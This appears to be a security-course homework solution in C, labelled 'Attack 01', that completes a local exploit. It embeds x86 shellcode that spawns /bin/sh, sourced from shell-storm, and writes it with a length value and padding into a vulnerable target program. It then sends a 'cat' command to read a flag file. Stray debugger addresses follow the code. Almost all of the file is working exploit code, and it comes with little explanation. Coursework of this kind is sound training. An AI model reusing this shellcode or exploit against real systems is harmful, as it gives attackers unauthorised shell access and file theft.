/* 
 * Attack 01 - Fill out this program to implement your attack for Problem 1
 */

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{
//ref http://shell-storm.org/shellcode/files/shellcode-811.php

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";
printf("%d\n", 19);
setbuf(stdout,NULL);
sleep(1);
printf("AAAAAA\n");
setbuf(stdout,NULL);
sleep(1);
printf("%s", shellcode);
setbuf(stdout,NULL);
sleep(1);
printf("cat /home/kamakshi/hw03/flag01.txt");
fflush(stdout);


  return 0;
}

0xffffd570       0xffffd570
ebp            0xffffd598 